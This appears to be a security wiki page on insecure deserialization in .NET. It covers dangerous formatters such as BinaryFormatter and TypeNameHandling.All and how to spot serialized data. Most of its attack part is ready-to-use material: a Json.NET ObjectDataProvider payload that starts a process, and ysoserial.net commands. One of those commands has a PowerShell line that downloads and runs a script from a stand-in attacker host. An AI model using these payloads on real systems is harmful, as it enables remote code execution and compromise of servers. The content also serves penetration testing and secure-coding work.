---
title: "Insecure Deserialization (.NET)"
type: technique
tags: [deserialization, dotnet, rce, serialization, bug-bounty]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[deserialization]]"]
status: active
---

# Insecure Deserialization (.NET)

## Overview

Insecure deserialization occurs when untrusted data is deserialized, potentially allowing RCE if malicious objects are reconstructed.

## Vulnerable .NET formatters

```csharp
// BinaryFormatter (most dangerous - RCE)
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);  // NEVER with untrusted input

// XmlSerializer (less dangerous but can have gadgets)
XmlSerializer xs = new XmlSerializer(typeof(MyClass));
xs.Deserialize(stream);

// JsonConvert (Newtonsoft) with TypeNameHandling
JsonConvert.DeserializeObject(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // DANGEROUS
});

// DataContractSerializer
// NetDataContractSerializer (includes type info - dangerous)
```

## Identification

```
# Headers that indicate .NET
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319

# Serialized objects in:
# - Cookies: AAEAAAD... (base64 of BinaryFormatter)
# - ViewState: /wEPDwUK... (base64)
# - Request body with Content-Type: application/octet-stream
# - JSON with "$type": "Namespace.Class, Assembly"
```

## ViewState attack

```
# ViewState is serialized via ObjectStateFormatter
# If MAC is not enabled (enableViewStateMac=false) -> injection possible

# Tool: ysoserial.net to generate payloads
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "whoami"
```

## JSON TypeNameHandling exploit

```json
// Payload with TypeNameHandling.All
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd", "/c calc.exe"]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    }
}
```

## ysoserial.net: payload generation

```bash
# List available gadgets
ysoserial.exe -l

# Generate an RCE payload
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties \
    -c "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" \
    -o base64

# For JSON.NET (Newtonsoft)
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "whoami" -o raw
```

## References
- ysoserial.net (GitHub)
